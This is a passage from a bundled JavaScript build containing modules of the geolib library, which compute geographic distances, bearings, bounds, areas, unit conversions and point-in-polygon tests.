      var toRad = function toRad2(value) {
        return value * Math.PI / 180;
      };
      var _default = toRad;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/toDeg.js
  var require_toDeg = __commonJS({
    "node_modules/geolib/es/toDeg.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var toDeg = function toDeg2(value) {
        return value * 180 / Math.PI;
      };
      var _default = toDeg;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/computeDestinationPoint.js
  var require_computeDestinationPoint = __commonJS({
    "node_modules/geolib/es/computeDestinationPoint.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _toRad = _interopRequireDefault(require_toRad());
      var _toDeg = _interopRequireDefault(require_toDeg());
      var _constants = require_constants();
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var computeDestinationPoint = function computeDestinationPoint2(start2, distance, bearing) {
        var radius = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : 6371e3;
        var lat = (0, _getLatitude.default)(start2);
        var lng = (0, _getLongitude.default)(start2);
        var delta = distance / radius;
        var theta = (0, _toRad.default)(bearing);
        var phi1 = (0, _toRad.default)(lat);
        var lambda1 = (0, _toRad.default)(lng);
        var phi2 = Math.asin(Math.sin(phi1) * Math.cos(delta) + Math.cos(phi1) * Math.sin(delta) * Math.cos(theta));
        var lambda2 = lambda1 + Math.atan2(Math.sin(theta) * Math.sin(delta) * Math.cos(phi1), Math.cos(delta) - Math.sin(phi1) * Math.sin(phi2));
        var longitude = (0, _toDeg.default)(lambda2);
        if (longitude < _constants.MINLON || longitude > _constants.MAXLON) {
          lambda2 = (lambda2 + 3 * Math.PI) % (2 * Math.PI) - Math.PI;
          longitude = (0, _toDeg.default)(lambda2);
        }
        return { latitude: (0, _toDeg.default)(phi2), longitude };
      };
      var _default = computeDestinationPoint;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/convertArea.js
  var require_convertArea = __commonJS({
    "node_modules/geolib/es/convertArea.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var convertArea = function convertArea2(squareMeters) {
        var targetUnit = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "m";
        var factor = _constants.areaConversion[targetUnit];
        if (factor) {
          return squareMeters * factor;
        }
        throw new Error("Invalid unit used for area conversion.");
      };
      var _default = convertArea;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/convertDistance.js
  var require_convertDistance = __commonJS({
    "node_modules/geolib/es/convertDistance.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var convertDistance2 = function convertDistance3(meters) {
        var targetUnit = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "m";
        var factor = _constants.distanceConversion[targetUnit];
        if (factor) {
          return meters * factor;
        }
        throw new Error("Invalid unit used for distance conversion.");
      };
      var _default = convertDistance2;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/convertSpeed.js
  var require_convertSpeed = __commonJS({
    "node_modules/geolib/es/convertSpeed.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _constants = require_constants();
      var convertSpeed = function convertSpeed2(metersPerSecond) {
        var targetUnit = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "kmh";
        switch (targetUnit) {
          case "kmh":
            return metersPerSecond * _constants.timeConversion.h * _constants.distanceConversion.km;
          case "mph":
            return metersPerSecond * _constants.timeConversion.h * _constants.distanceConversion.mi;
          default:
            return metersPerSecond;
        }
      };
      var _default = convertSpeed;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/decimalToSexagesimal.js
  var require_decimalToSexagesimal = __commonJS({
    "node_modules/geolib/es/decimalToSexagesimal.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      function _slicedToArray(arr, i) {
        return _arrayWithHoles(arr) || _iterableToArrayLimit(arr, i) || _unsupportedIterableToArray(arr, i) || _nonIterableRest();
      }
      function _nonIterableRest() {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      function _unsupportedIterableToArray(o, minLen) {
        if (!o)
          return;
        if (typeof o === "string")
          return _arrayLikeToArray(o, minLen);
        var n = Object.prototype.toString.call(o).slice(8, -1);
        if (n === "Object" && o.constructor)
          n = o.constructor.name;
        if (n === "Map" || n === "Set")
          return Array.from(o);
        if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))
          return _arrayLikeToArray(o, minLen);
      }
      function _arrayLikeToArray(arr, len) {
        if (len == null || len > arr.length)
          len = arr.length;
        for (var i = 0, arr2 = new Array(len); i < len; i++) {
          arr2[i] = arr[i];
        }
        return arr2;
      }
      function _iterableToArrayLimit(arr, i) {
        if (typeof Symbol === "undefined" || !(Symbol.iterator in Object(arr)))
          return;
        var _arr = [];
        var _n = true;
        var _d = false;
        var _e = void 0;
        try {
          for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) {
            _arr.push(_s.value);
            if (i && _arr.length === i)
              break;
          }
        } catch (err) {
          _d = true;
          _e = err;
        } finally {
          try {
            if (!_n && _i["return"] != null)
              _i["return"]();
          } finally {
            if (_d)
              throw _e;
          }
        }
        return _arr;
      }
      function _arrayWithHoles(arr) {
        if (Array.isArray(arr))
          return arr;
      }
      var imprecise = function imprecise2(number) {
        var decimals = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 4;
        var factor = Math.pow(10, decimals);
        return Math.round(number * factor) / factor;
      };
      var decimal2sexagesimalNext = function decimal2sexagesimalNext2(decimal) {
        var _decimal$toString$spl = decimal.toString().split("."), _decimal$toString$spl2 = _slicedToArray(_decimal$toString$spl, 2), pre = _decimal$toString$spl2[0], post = _decimal$toString$spl2[1];
        var deg = Math.abs(Number(pre));
        var min0 = Number("0." + (post || 0)) * 60;
        var sec0 = min0.toString().split(".");
        var min = Math.floor(min0);
        var sec = imprecise(Number("0." + (sec0[1] || 0)) * 60).toString();
        var _sec$split = sec.split("."), _sec$split2 = _slicedToArray(_sec$split, 2), secPreDec = _sec$split2[0], _sec$split2$ = _sec$split2[1], secDec = _sec$split2$ === void 0 ? "0" : _sec$split2$;
        return deg + "\xB0 " + min.toString().padStart(2, "0") + "' " + secPreDec.padStart(2, "0") + "." + secDec.padEnd(1, "0") + '"';
      };
      var _default = decimal2sexagesimalNext;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/robustAcos.js
  var require_robustAcos = __commonJS({
    "node_modules/geolib/es/robustAcos.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var robustAcos = function robustAcos2(value) {
        if (value > 1) {
          return 1;
        }
        if (value < -1) {
          return -1;
        }
        return value;
      };
      var _default = robustAcos;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getDistance.js
  var require_getDistance = __commonJS({
    "node_modules/geolib/es/getDistance.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _toRad = _interopRequireDefault(require_toRad());
      var _robustAcos = _interopRequireDefault(require_robustAcos());
      var _constants = require_constants();
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getDistance2 = function getDistance3(from, to) {
        var accuracy = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : 1;
        accuracy = typeof accuracy !== "undefined" && !isNaN(accuracy) ? accuracy : 1;
        var fromLat = (0, _getLatitude.default)(from);
        var fromLon = (0, _getLongitude.default)(from);
        var toLat = (0, _getLatitude.default)(to);
        var toLon = (0, _getLongitude.default)(to);
        var distance = Math.acos((0, _robustAcos.default)(Math.sin((0, _toRad.default)(toLat)) * Math.sin((0, _toRad.default)(fromLat)) + Math.cos((0, _toRad.default)(toLat)) * Math.cos((0, _toRad.default)(fromLat)) * Math.cos((0, _toRad.default)(fromLon) - (0, _toRad.default)(toLon)))) * _constants.earthRadius;
        return Math.round(distance / accuracy) * accuracy;
      };
      var _default = getDistance2;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/orderByDistance.js
  var require_orderByDistance = __commonJS({
    "node_modules/geolib/es/orderByDistance.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getDistance = _interopRequireDefault(require_getDistance());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var orderByDistance = function orderByDistance2(point, coords) {
        var distanceFn = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : _getDistance.default;
        distanceFn = typeof distanceFn === "function" ? distanceFn : _getDistance.default;
        return coords.slice().sort(function(a, b) {
          return distanceFn(point, a) - distanceFn(point, b);
        });
      };
      var _default = orderByDistance;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/findNearest.js
  var require_findNearest = __commonJS({
    "node_modules/geolib/es/findNearest.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _orderByDistance = _interopRequireDefault(require_orderByDistance());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var findNearest = function findNearest2(point, coords) {
        return (0, _orderByDistance.default)(point, coords)[0];
      };
      var _default = findNearest;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getAreaOfPolygon.js
  var require_getAreaOfPolygon = __commonJS({
    "node_modules/geolib/es/getAreaOfPolygon.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _toRad = _interopRequireDefault(require_toRad());
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _constants = require_constants();
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getAreaOfPolygon = function getAreaOfPolygon2(points) {
        var area = 0;
        if (points.length > 2) {
          var lowerIndex;
          var middleIndex;
          var upperIndex;
          for (var i = 0; i < points.length; i++) {
            if (i === points.length - 2) {
              lowerIndex = points.length - 2;
              middleIndex = points.length - 1;
              upperIndex = 0;
            } else if (i === points.length - 1) {
              lowerIndex = points.length - 1;
              middleIndex = 0;
              upperIndex = 1;
            } else {
              lowerIndex = i;
              middleIndex = i + 1;
              upperIndex = i + 2;
            }
            var p1lon = (0, _getLongitude.default)(points[lowerIndex]);
            var p2lat = (0, _getLatitude.default)(points[middleIndex]);
            var p3lon = (0, _getLongitude.default)(points[upperIndex]);
            area += ((0, _toRad.default)(p3lon) - (0, _toRad.default)(p1lon)) * Math.sin((0, _toRad.default)(p2lat));
          }
          area = area * _constants.earthRadius * _constants.earthRadius / 2;
        }
        return Math.abs(area);
      };
      var _default = getAreaOfPolygon;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getBounds.js
  var require_getBounds = __commonJS({
    "node_modules/geolib/es/getBounds.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getBounds = function getBounds2(points) {
        if (Array.isArray(points) === false || points.length === 0) {
          throw new Error("No points were given.");
        }
        return points.reduce(function(stats, point) {
          var latitude = (0, _getLatitude.default)(point);
          var longitude = (0, _getLongitude.default)(point);
          return { maxLat: Math.max(latitude, stats.maxLat), minLat: Math.min(latitude, stats.minLat), maxLng: Math.max(longitude, stats.maxLng), minLng: Math.min(longitude, stats.minLng) };
        }, { maxLat: -Infinity, minLat: Infinity, maxLng: -Infinity, minLng: Infinity });
      };
      var _default = getBounds;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getBoundsOfDistance.js
  var require_getBoundsOfDistance = __commonJS({
    "node_modules/geolib/es/getBoundsOfDistance.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _toRad = _interopRequireDefault(require_toRad());
      var _toDeg = _interopRequireDefault(require_toDeg());
      var _constants = require_constants();
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getBoundsOfDistance = function getBoundsOfDistance2(point, distance) {
        var latitude = (0, _getLatitude.default)(point);
        var longitude = (0, _getLongitude.default)(point);
        var radLat = (0, _toRad.default)(latitude);
        var radLon = (0, _toRad.default)(longitude);
        var radDist = distance / _constants.earthRadius;
        var minLat = radLat - radDist;
        var maxLat = radLat + radDist;
        var MAX_LAT_RAD = (0, _toRad.default)(_constants.MAXLAT);
        var MIN_LAT_RAD = (0, _toRad.default)(_constants.MINLAT);
        var MAX_LON_RAD = (0, _toRad.default)(_constants.MAXLON);
        var MIN_LON_RAD = (0, _toRad.default)(_constants.MINLON);
        var minLon;
        var maxLon;
        if (minLat > MIN_LAT_RAD && maxLat < MAX_LAT_RAD) {
          var deltaLon = Math.asin(Math.sin(radDist) / Math.cos(radLat));
          minLon = radLon - deltaLon;
          if (minLon < MIN_LON_RAD) {
            minLon += Math.PI * 2;
          }
          maxLon = radLon + deltaLon;
          if (maxLon > MAX_LON_RAD) {
            maxLon -= Math.PI * 2;
          }
        } else {
          minLat = Math.max(minLat, MIN_LAT_RAD);
          maxLat = Math.min(maxLat, MAX_LAT_RAD);
          minLon = MIN_LON_RAD;
          maxLon = MAX_LON_RAD;
        }
        return [{ latitude: (0, _toDeg.default)(minLat), longitude: (0, _toDeg.default)(minLon) }, { latitude: (0, _toDeg.default)(maxLat), longitude: (0, _toDeg.default)(maxLon) }];
      };
      var _default = getBoundsOfDistance;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getCenter.js
  var require_getCenter = __commonJS({
    "node_modules/geolib/es/getCenter.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _toRad = _interopRequireDefault(require_toRad());
      var _toDeg = _interopRequireDefault(require_toDeg());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getCenter = function getCenter2(points) {
        if (Array.isArray(points) === false || points.length === 0) {
          return false;
        }
        var numberOfPoints = points.length;
        var sum = points.reduce(function(acc, point) {
          var pointLat = (0, _toRad.default)((0, _getLatitude.default)(point));
          var pointLon = (0, _toRad.default)((0, _getLongitude.default)(point));
          return { X: acc.X + Math.cos(pointLat) * Math.cos(pointLon), Y: acc.Y + Math.cos(pointLat) * Math.sin(pointLon), Z: acc.Z + Math.sin(pointLat) };
        }, { X: 0, Y: 0, Z: 0 });
        var X = sum.X / numberOfPoints;
        var Y = sum.Y / numberOfPoints;
        var Z = sum.Z / numberOfPoints;
        return { longitude: (0, _toDeg.default)(Math.atan2(Y, X)), latitude: (0, _toDeg.default)(Math.atan2(Z, Math.sqrt(X * X + Y * Y))) };
      };
      var _default = getCenter;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getCenterOfBounds.js
  var require_getCenterOfBounds = __commonJS({
    "node_modules/geolib/es/getCenterOfBounds.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getBounds = _interopRequireDefault(require_getBounds());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getCenterOfBounds = function getCenterOfBounds2(coords) {
        var bounds = (0, _getBounds.default)(coords);
        var latitude = bounds.minLat + (bounds.maxLat - bounds.minLat) / 2;
        var longitude = bounds.minLng + (bounds.maxLng - bounds.minLng) / 2;
        return { latitude: parseFloat(latitude.toFixed(6)), longitude: parseFloat(longitude.toFixed(6)) };
      };
      var _default = getCenterOfBounds;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getRhumbLineBearing.js
  var require_getRhumbLineBearing = __commonJS({
    "node_modules/geolib/es/getRhumbLineBearing.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _toRad = _interopRequireDefault(require_toRad());
      var _toDeg = _interopRequireDefault(require_toDeg());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getRhumbLineBearing = function getRhumbLineBearing2(origin, dest) {
        var diffLon = (0, _toRad.default)((0, _getLongitude.default)(dest)) - (0, _toRad.default)((0, _getLongitude.default)(origin));
        var diffPhi = Math.log(Math.tan((0, _toRad.default)((0, _getLatitude.default)(dest)) / 2 + Math.PI / 4) / Math.tan((0, _toRad.default)((0, _getLatitude.default)(origin)) / 2 + Math.PI / 4));
        if (Math.abs(diffLon) > Math.PI) {
          if (diffLon > 0) {
            diffLon = (Math.PI * 2 - diffLon) * -1;
          } else {
            diffLon = Math.PI * 2 + diffLon;
          }
        }
        return ((0, _toDeg.default)(Math.atan2(diffLon, diffPhi)) + 360) % 360;
      };
      var _default = getRhumbLineBearing;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getCompassDirection.js
  var require_getCompassDirection = __commonJS({
    "node_modules/geolib/es/getCompassDirection.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getRhumbLineBearing = _interopRequireDefault(require_getRhumbLineBearing());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getCompassDirection = function getCompassDirection2(origin, dest) {
        var bearingFn = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : _getRhumbLineBearing.default;
        var bearing = typeof bearingFn === "function" ? bearingFn(origin, dest) : (0, _getRhumbLineBearing.default)(origin, dest);
        if (isNaN(bearing)) {
          throw new Error("Could not calculate bearing for given points. Check your bearing function");
        }
        switch (Math.round(bearing / 22.5)) {
          case 1:
            return "NNE";
          case 2:
            return "NE";
          case 3:
            return "ENE";
          case 4:
            return "E";
          case 5:
            return "ESE";
          case 6:
            return "SE";
          case 7:
            return "SSE";
          case 8:
            return "S";
          case 9:
            return "SSW";
          case 10:
            return "SW";
          case 11:
            return "WSW";
          case 12:
            return "W";
          case 13:
            return "WNW";
          case 14:
            return "NW";
          case 15:
            return "NNW";
          default:
            return "N";
        }
      };
      var _default = getCompassDirection;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getDistanceFromLine.js
  var require_getDistanceFromLine = __commonJS({
    "node_modules/geolib/es/getDistanceFromLine.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getDistance = _interopRequireDefault(require_getDistance());
      var _robustAcos = _interopRequireDefault(require_robustAcos());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getDistanceFromLine = function getDistanceFromLine2(point, lineStart, lineEnd) {
        var accuracy = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : 1;
        var d1 = (0, _getDistance.default)(lineStart, point, accuracy);
        var d2 = (0, _getDistance.default)(point, lineEnd, accuracy);
        var d3 = (0, _getDistance.default)(lineStart, lineEnd, accuracy);
        var alpha = Math.acos((0, _robustAcos.default)((d1 * d1 + d3 * d3 - d2 * d2) / (2 * d1 * d3)));
        var beta = Math.acos((0, _robustAcos.default)((d2 * d2 + d3 * d3 - d1 * d1) / (2 * d2 * d3)));
        if (alpha > Math.PI / 2) {
          return d1;
        }
        if (beta > Math.PI / 2) {
          return d2;
        }
        return Math.sin(alpha) * d1;
      };
      var _default = getDistanceFromLine;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getGreatCircleBearing.js
  var require_getGreatCircleBearing = __commonJS({
    "node_modules/geolib/es/getGreatCircleBearing.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _toRad = _interopRequireDefault(require_toRad());
      var _toDeg = _interopRequireDefault(require_toDeg());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getGreatCircleBearing = function getGreatCircleBearing2(origin, dest) {
        var destLat = (0, _getLatitude.default)(dest);
        var detLon = (0, _getLongitude.default)(dest);
        var originLat = (0, _getLatitude.default)(origin);
        var originLon = (0, _getLongitude.default)(origin);
        var bearing = ((0, _toDeg.default)(Math.atan2(Math.sin((0, _toRad.default)(detLon) - (0, _toRad.default)(originLon)) * Math.cos((0, _toRad.default)(destLat)), Math.cos((0, _toRad.default)(originLat)) * Math.sin((0, _toRad.default)(destLat)) - Math.sin((0, _toRad.default)(originLat)) * Math.cos((0, _toRad.default)(destLat)) * Math.cos((0, _toRad.default)(detLon) - (0, _toRad.default)(originLon)))) + 360) % 360;
        return bearing;
      };
      var _default = getGreatCircleBearing;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getPathLength.js
  var require_getPathLength = __commonJS({
    "node_modules/geolib/es/getPathLength.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getDistance = _interopRequireDefault(require_getDistance());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      function _typeof(obj) {
        "@babel/helpers - typeof";
        if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") {
          _typeof = function _typeof2(obj2) {
            return typeof obj2;
          };
        } else {
          _typeof = function _typeof2(obj2) {
            return obj2 && typeof Symbol === "function" && obj2.constructor === Symbol && obj2 !== Symbol.prototype ? "symbol" : typeof obj2;
          };
        }
        return _typeof(obj);
      }
      var getPathLength = function getPathLength2(points) {
        var distanceFn = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : _getDistance.default;
        return points.reduce(function(acc, point) {
          if (_typeof(acc) === "object" && acc.last !== null) {
            acc.distance += distanceFn(point, acc.last);
          }
          acc.last = point;
          return acc;
        }, { last: null, distance: 0 }).distance;
      };
      var _default = getPathLength;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getPreciseDistance.js
  var require_getPreciseDistance = __commonJS({
    "node_modules/geolib/es/getPreciseDistance.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _toRad = _interopRequireDefault(require_toRad());
      var _constants = require_constants();
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getDistance2 = function getDistance3(start2, end) {
        var accuracy = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : 1;
        accuracy = typeof accuracy !== "undefined" && !isNaN(accuracy) ? accuracy : 1;
        var startLat = (0, _getLatitude.default)(start2);
        var startLon = (0, _getLongitude.default)(start2);
        var endLat = (0, _getLatitude.default)(end);
        var endLon = (0, _getLongitude.default)(end);
        var b = 6356752314245e-6;
        var ellipsoidParams = 1 / 298.257223563;
        var L = (0, _toRad.default)(endLon - startLon);
        var cosSigma;
        var sigma;
        var sinAlpha;
        var cosSqAlpha;
        var cos2SigmaM;
        var sinSigma;
        var U1 = Math.atan((1 - ellipsoidParams) * Math.tan((0, _toRad.default)(parseFloat(startLat))));
        var U2 = Math.atan((1 - ellipsoidParams) * Math.tan((0, _toRad.default)(parseFloat(endLat))));
        var sinU1 = Math.sin(U1);
        var cosU1 = Math.cos(U1);
        var sinU2 = Math.sin(U2);
        var cosU2 = Math.cos(U2);
        var lambda = L;
        var lambdaP;
        var iterLimit = 100;
        do {
          var sinLambda = Math.sin(lambda);
          var cosLambda = Math.cos(lambda);
          sinSigma = Math.sqrt(cosU2 * sinLambda * (cosU2 * sinLambda) + (cosU1 * sinU2 - sinU1 * cosU2 * cosLambda) * (cosU1 * sinU2 - sinU1 * cosU2 * cosLambda));
          if (sinSigma === 0) {
            return 0;
          }
          cosSigma = sinU1 * sinU2 + cosU1 * cosU2 * cosLambda;
          sigma = Math.atan2(sinSigma, cosSigma);
          sinAlpha = cosU1 * cosU2 * sinLambda / sinSigma;
          cosSqAlpha = 1 - sinAlpha * sinAlpha;
          cos2SigmaM = cosSigma - 2 * sinU1 * sinU2 / cosSqAlpha;
          if (isNaN(cos2SigmaM)) {
            cos2SigmaM = 0;
          }
          var C = ellipsoidParams / 16 * cosSqAlpha * (4 + ellipsoidParams * (4 - 3 * cosSqAlpha));
          lambdaP = lambda;
          lambda = L + (1 - C) * ellipsoidParams * sinAlpha * (sigma + C * sinSigma * (cos2SigmaM + C * cosSigma * (-1 + 2 * cos2SigmaM * cos2SigmaM)));
        } while (Math.abs(lambda - lambdaP) > 1e-12 && --iterLimit > 0);
        if (iterLimit === 0) {
          return NaN;
        }
        var uSq = cosSqAlpha * (_constants.earthRadius * _constants.earthRadius - b * b) / (b * b);
        var A = 1 + uSq / 16384 * (4096 + uSq * (-768 + uSq * (320 - 175 * uSq)));
        var B = uSq / 1024 * (256 + uSq * (-128 + uSq * (74 - 47 * uSq)));
        var deltaSigma = B * sinSigma * (cos2SigmaM + B / 4 * (cosSigma * (-1 + 2 * cos2SigmaM * cos2SigmaM) - B / 6 * cos2SigmaM * (-3 + 4 * sinSigma * sinSigma) * (-3 + 4 * cos2SigmaM * cos2SigmaM)));
        var distance = b * A * (sigma - deltaSigma);
        return Math.round(distance / accuracy) * accuracy;
      };
      var _default = getDistance2;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getRoughCompassDirection.js
  var require_getRoughCompassDirection = __commonJS({
    "node_modules/geolib/es/getRoughCompassDirection.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var getRoughCompassDirection = function getRoughCompassDirection2(exact) {
        if (/^(NNE|NE|NNW|N)$/.test(exact)) {
          return "N";
        }
        if (/^(ENE|E|ESE|SE)$/.test(exact)) {
          return "E";
        }
        if (/^(SSE|S|SSW|SW)$/.test(exact)) {
          return "S";
        }
        if (/^(WSW|W|WNW|NW)$/.test(exact)) {
          return "W";
        }
      };
      var _default = getRoughCompassDirection;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/getSpeed.js
  var require_getSpeed = __commonJS({
    "node_modules/geolib/es/getSpeed.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getDistance = _interopRequireDefault(require_getDistance());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var getSpeed = function getSpeed2(start2, end) {
        var distanceFn = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : _getDistance.default;
        var distance = distanceFn(start2, end);
        var time = Number(end.time) - Number(start2.time);
        var metersPerSecond = distance / time * 1e3;
        return metersPerSecond;
      };
      var _default = getSpeed;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isPointInLine.js
  var require_isPointInLine = __commonJS({
    "node_modules/geolib/es/isPointInLine.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getDistance = _interopRequireDefault(require_getDistance());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var isPointInLine = function isPointInLine2(point, lineStart, lineEnd) {
        return (0, _getDistance.default)(lineStart, point) + (0, _getDistance.default)(point, lineEnd) === (0, _getDistance.default)(lineStart, lineEnd);
      };
      var _default = isPointInLine;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isPointInPolygon.js
  var require_isPointInPolygon = __commonJS({
    "node_modules/geolib/es/isPointInPolygon.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var isPointInPolygon = function isPointInPolygon2(point, polygon) {
        var isInside = false;
        var totalPolys = polygon.length;
        for (var i = -1, j = totalPolys - 1; ++i < totalPolys; j = i) {
          if (((0, _getLongitude.default)(polygon[i]) <= (0, _getLongitude.default)(point) && (0, _getLongitude.default)(point) < (0, _getLongitude.default)(polygon[j]) || (0, _getLongitude.default)(polygon[j]) <= (0, _getLongitude.default)(point) && (0, _getLongitude.default)(point) < (0, _getLongitude.default)(polygon[i])) && (0, _getLatitude.default)(point) < ((0, _getLatitude.default)(polygon[j]) - (0, _getLatitude.default)(polygon[i])) * ((0, _getLongitude.default)(point) - (0, _getLongitude.default)(polygon[i])) / ((0, _getLongitude.default)(polygon[j]) - (0, _getLongitude.default)(polygon[i])) + (0, _getLatitude.default)(polygon[i])) {
            isInside = !isInside;
          }
        }
        return isInside;
      };
      var _default = isPointInPolygon;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isPointNearLine.js
